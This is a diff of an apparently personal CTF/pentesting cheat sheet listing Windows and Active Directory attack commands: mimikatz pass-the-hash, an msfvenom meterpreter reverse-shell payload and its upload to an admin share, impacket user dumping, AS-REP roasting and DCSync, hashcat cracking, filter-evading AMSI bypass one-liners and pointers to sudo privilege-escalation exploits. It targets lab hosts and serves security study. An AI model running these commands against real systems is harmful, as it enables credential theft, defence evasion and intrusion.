@@ -21,6 +21,7 @@
     * grep -iR pcup{ .
     * updatedb/locate (special file extensions relevant to challenge, ex. png)
     * cat other users .bash\_history files
+    * sudo -l
 
 # OCO
 
@@ -44,12 +45,12 @@
 ## Windows
 
 * Use `more` to open Alternate Data Streams
-* Base64: [System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("lkjasflkjasdfklj"))
+* Base64: `[System.Text.Encoding]::UTF8.GetSTring([System.convert]::FromBase64String("lkjasflkjasdfklj"))`
 * Mimikatz
-    * sekurlsa::pth /user:Administrator /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
+    * `sekurlsa::pth /user:Administrator /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd`
 * Responder syntax
-* msfvenom -p windows/x64/meterpreter_reverse_https -a x64 LHOST=192.168.58.128 LPORT=443 -f exe --platform Windows -o reverse_https.exe
-* Curl to smb upload files: curl --upload-file /root/reverse_https.exe -u 'windev2101eval\user' smb://192.168.58.153/c$/
+* `msfvenom -p windows/x64/meterpreter_reverse_https -a x64 LHOST=192.168.58.128 LPORT=443 -f exe --platform Windows -o reverse_https.exe`
+* Curl to smb upload files: `curl --upload-file /root/reverse_https.exe -u 'windev2101eval\user' smb://192.168.58.153/c$/`
 * Meterpreter Post
     * https://www.offensive-security.com/metasploit-unleashed/post-module-reference/
     * use windows/manage/multi_meterpreter_inject
@@ -76,9 +77,9 @@
             * Null LDAP queries: rpcclient -U "" -n 10.10.10.161 
                 * enumdomusers
                 * enumdomgroups
-        * Dump LDAP users: impacket-GetADUsers -all -no-pass -dc-ip 10.10.10.161 htb.local/
-        * Find ASREPRoast'able: impacket-GetNPUsers -usersfile users.txt -request -dc-ip 10.10.10.161 -no-pass htb.local/
-        * Hashcat for ASREP: hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force
+        * Dump LDAP users: `impacket-GetADUsers -all -no-pass -dc-ip 10.10.10.161 htb.local/`
+        * Find ASREPRoast'able: `impacket-GetNPUsers -usersfile users.txt -request -dc-ip 10.10.10.161 -no-pass htb.local/`
+        * Hashcat for ASREP: `hashcat -m 18200 svc-alfresco.kerb /usr/share/wordlists/rockyou.txt --force`
         * Evil-winrm
             * evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice -s /root/tools/powershell_scripts/
             * menu
@@ -95,17 +96,22 @@
             * Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity testt -Rights DCSync
         * impacket-secretsdump -dc-ip 10.10.10.161 htb.local/testt:password@10.10.10.161
         * impacket-psexec htb.local/administrator@10.10.10.161 'powershell.exe' -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
-    * hascat for TGS: hashcat -m 13100 administrator.kerb /usr/share/wordlists/rockyou.txt --force -potfile-disable
+    * hascat for TGS: `hashcat -m 13100 administrator.kerb /usr/share/wordlists/rockyou.txt --force -potfile-disable`
     * AMSI
         * Disable AMSI (has been patched): [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
         * Same thing as above but evades filters: [Ref].Assembly.GetType("System.Management.Automation.Amsi"+"Utils").GetField("amsiIn"+"itFailed","NonPublic,Static").SetValue($null,$true)
         * May need to run the command again if you get blocked again. Triggering AMSI too many times causes a lockout, then you can't even disable it.
         * Here's a repo with more AMSI stuff: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell (the above commands are the Matt Graebers Reflection method)
+    * Get all files from a remote SMB share
+        * `smbclient //10.10.10.100/Replication`
+        * `RECURSE ON`
+        * `PROMPT OFF`
+        * `mget *`
 
 
 ## Linux
 * Password bruteforce wordlist mangling generation:
-    * rsmangler -p -d -r -t -T -c -u -l -s -e -I --punctuation -a -C --pna --pnb --na -nb --force --space --file words.txt --output wordsmangled.txt
+    * `rsmangler -p -d -r -t -T -c -u -l -s -e -I --punctuation -a -C --pna --pnb --na -nb --force --space --file words.txt --output wordsmangled.txt`
 * Baron Samedit sudo vuln (CVE-2021-3156) - 1.8.2 to 1.8.31p2 and 1.9.0 to 1.9.5p1
     * https://github.com/blasty/CVE-2021-3156/
     * https://github.com/TH3xACE/SUDO_KILLER/tree/master/exploits/CVE-2021-3156 <- different exploits for different versions. See readme, pick one. 
